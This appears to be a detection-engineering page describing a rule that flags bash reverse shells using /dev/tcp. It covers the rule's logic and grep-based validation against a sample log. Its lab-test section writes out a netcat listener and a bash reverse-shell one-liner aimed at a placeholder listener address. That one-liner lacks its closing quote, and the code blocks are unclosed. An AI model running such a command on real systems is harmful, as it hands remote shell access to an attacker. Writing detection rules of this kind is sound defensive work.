# Bash Reverse Shell via /dev/tcp (T1059.004)

## What it detects
A bash process whose command line contains `/dev/tcp/`. This is the
shortest portable reverse-shell one-liner on Linux.

## Why it matters
It requires no external tooling — just bash. Common in post-exploitation
where the attacker has a shell but no netcat. High signal, low noise
when baselined.

## Test it (lab only — this opens a real outbound connection)

On a lab host, to a listener YOU control:

```bash
# On the listener machine:
nc -lvnp 4444

# On the target lab host:
bash -c 'bash -i >& /dev/tcp/LISTENER_IP/4444 0>&1

## Proof / validation

Sample log: [`tests/reverse_shell_devtcp_sample.log`](../tests/reverse_shell_devtcp_sample.log)

Three EXECVE events: one real `/dev/tcp` reverse shell, one benign
`/dev/tcp` connectivity check, one unrelated `ls`.

Rule condition: `Image endswith /bash` AND `CommandLine contains /dev/tcp/`.
→ Only the first event matches → **rule fires once**.

Validate locally:

```bash
grep '/dev/tcp/' tests/reverse_shell_devtcp_sample.log | grep -c 'bash'
# expected: 1  (only the reverse shell line has bash + /dev/tcp)

grep -c '/dev/tcp/' tests/reverse_shell_devtcp_sample.log
# expected: 2  (one bash shell, one benign sh connectivity check)
